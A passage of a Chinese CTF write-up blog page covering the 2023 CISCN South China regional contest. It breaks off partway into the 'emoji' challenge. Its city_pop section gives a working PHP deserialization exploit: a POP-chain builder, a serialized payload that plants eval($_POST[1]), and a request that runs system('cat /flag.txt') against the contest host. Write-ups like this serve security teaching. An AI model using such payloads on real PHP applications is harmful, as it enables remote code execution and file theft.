@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="下了三天雨，啥也没看着。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解">
+<meta property="og:url" content="https://southsea.st/2023-CISCN-SOUTH/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="下了三天雨，啥也没看着。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-06-26T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.071Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Crypto">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2023-CISCN-SOUTH/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2023-CISCN-SOUTH/","path":"2023-CISCN-SOUTH/","title":"2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#city_pop"><span class="nav-number">1.</span> <span class="nav-text">city_pop</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pop-%E9%93%BE%E6%9E%84%E9%80%A0"><span class="nav-number">1.1.</span> <span class="nav-text">POP 链构造</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%8F%98%E9%87%8F%E4%BC%A0%E5%8F%82"><span class="nav-number">1.2.</span> <span class="nav-text">字符变量传参</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#emoji"><span class="nav-number">2.</span> <span class="nav-text">emoji</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81"><span class="nav-number">2.1.</span> <span class="nav-text">编码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unicode"><span class="nav-number">2.1.1.</span> <span class="nav-text">Unicode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#utf-16"><span class="nav-number">2.1.2.</span> <span class="nav-text">UTF-16</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tostring"><span class="nav-number">2.2.</span> <span class="nav-text">ToString</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.1.</span> <span class="nav-text">数字类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.2.</span> <span class="nav-text">字符串类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.3.</span> <span class="nav-text">布尔类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B"><span class="nav-number">2.2.4.</span> <span class="nav-text">数组类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#includes"><span class="nav-number">2.3.</span> <span class="nav-text">includes</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">字符串类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B-1"><span class="nav-number">2.3.2.</span> <span class="nav-text">数组类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-number">2.4.</span> <span class="nav-text">结论</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pollution"><span class="nav-number">3.</span> <span class="nav-text">pollution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#readfilesync"><span class="nav-number">3.1.</span> <span class="nav-text">readFileSync</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA-1"><span class="nav-number">3.2.</span> <span class="nav-text">结论</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#refer"><span class="nav-number">4.</span> <span class="nav-text">REFER</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2023-CISCN-SOUTH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023 第十六届全国大学生信息安全竞赛 创新实践能力赛 华南赛区 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-06-26 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-26T00:00:00+00:00">2023-06-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>下了三天雨，啥也没看着。</p>
+<span id="more"></span>
+<h1 id="city_pop">city_pop</h1>
+<p>提示了 <strong>pop.php</strong>。</p>
+<p><strong>filter</strong> 替换 <strong>getflag</strong> 为
+<strong>hark</strong>，少了两个字符，而 <strong>Start</strong>
+方法无法传参对象，因此猜测是反序列化逃逸。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;getflag&quot;</span>,<span class="string">&#x27;hark&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span>,<span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end=<span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Go</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;ray;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Done</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$use</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useless</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">use</span>=$<span class="title">this</span>-&gt;<span class="title">useless</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">eval</span>=<span class="string">&#x27;no way&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ciscn_huaibei.pop&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ciscn_huaibei.pop&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$ser</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="pop-链构造">POP 链构造</h2>
+<p>思路是 <strong>Go</strong> 的 <strong>destruct</strong> 调用
+<strong>Get</strong> 的 <strong>toString</strong>，然后跳转
+<strong>get</strong> 最后到 <strong>Done</strong> 的
+<strong>invoke</strong>。</p>
+<p>而 <strong>Done</strong> 中有 <strong>wakeup</strong> 对
+<strong>eval</strong> 进行了覆写，因此将赋值 <strong>use</strong> 地址给
+<strong>eval</strong>，通过对 <strong>use</strong> 赋值来更改
+<strong>eval</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Go</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Get</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Done</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eval</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$use</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useless</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Done</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">use</span> =&amp; $<span class="title">d</span>-&gt;<span class="title">eval</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">eval</span> = <span class="string">&#x27;no way&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span>-&gt;useless = <span class="string">&quot;eval(\$_POST[1]);&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="keyword">use</span> = $<span class="title">d</span>-&gt;<span class="title">useless</span>;</span><br><span class="line"><span class="variable">$get</span> = <span class="keyword">new</span> <span class="title class_">Get</span>(<span class="keyword">new</span> <span class="title class_">Get</span>(<span class="string">&quot;1&quot;</span>, <span class="variable">$d</span>), <span class="string">&quot;phpinfo()&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$go</span> = <span class="keyword">new</span> <span class="title class_">Go</span>;</span><br><span class="line"><span class="variable">$go</span>-&gt;ray = <span class="variable">$get</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Start</span>(<span class="string">&#x27;getflaggetflaggetflaggetflaggetflaggetflag&#x27;</span>, <span class="variable">$go</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:5:&quot;Start&quot;:2:&#123;s:5:&quot;start&quot;;s:42:&quot;getflaggetflaggetflaggetflaggetflaggetflag&quot;;s:3:&quot;end&quot;;O:2:&quot;Go&quot;:1:&#123;s:3:&quot;ray&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;s:9:&quot;phpinfo()&quot;;s:4:&quot;name&quot;;O:3:&quot;Get&quot;:2:&#123;s:4:&quot;func&quot;;O:4:&quot;Done&quot;:4:&#123;s:4:&quot;eval&quot;;s:10:&quot;phpinfo();&quot;;s:5:&quot;class&quot;;N;s:3:&quot;use&quot;;R:8;s:7:&quot;useless&quot;;s:10:&quot;phpinfo();&quot;;&#125;s:4:&quot;name&quot;;s:1:&quot;1&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="字符变量传参">字符变量传参</h2>
+<p>对于 <strong>ciscn_huaibei.pop</strong> 这个传参来说，<strong><a
+target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-7.3.4/main/php_variables.c#L192">PHP</a></strong>
+在遇到 <strong>[</strong> 的时候，如果没有匹配到接下来的
+<strong>]</strong>，则会替换其为 <strong>_</strong>，然后直接
+<strong>return</strong> 不管后面了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ip = <span class="built_in">strchr</span>(ip, <span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!ip) &#123;</span><br><span class="line">    <span class="comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span></span><br><span class="line">    *(index_s - <span class="number">1</span>) = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    index_len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (index) &#123;</span><br><span class="line">        index_len = <span class="built_in">strlen</span>(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> plain_var;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="总结">总结</h2>
+<p>直接构造。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http://172.1.14.1/pop.php?ciscn[huaibei.pop=getflaggetflaggetflaggetflaggetflaggetflag&amp;pop=;s:3:%22end%22;O:2:%22Go%22:1:&#123;s:3:%22ray%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;s:9:%22phpinfo()%22;s:4:%22name%22;O:3:%22Get%22:2:&#123;s:4:%22func%22;O:4:%22Done%22:4:&#123;s:4:%22eval%22;s:16:%22eval($_POST[1]);%22;s:5:%22class%22;N;s:3:%22use%22;R:8;s:7:%22useless%22;s:16:%22eval($_POST[1]);%22;&#125;s:4:%22name%22;s:1:%221%22;&#125;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">1=system(&#x27;cat /flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+<h1 id="emoji">emoji</h1>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span 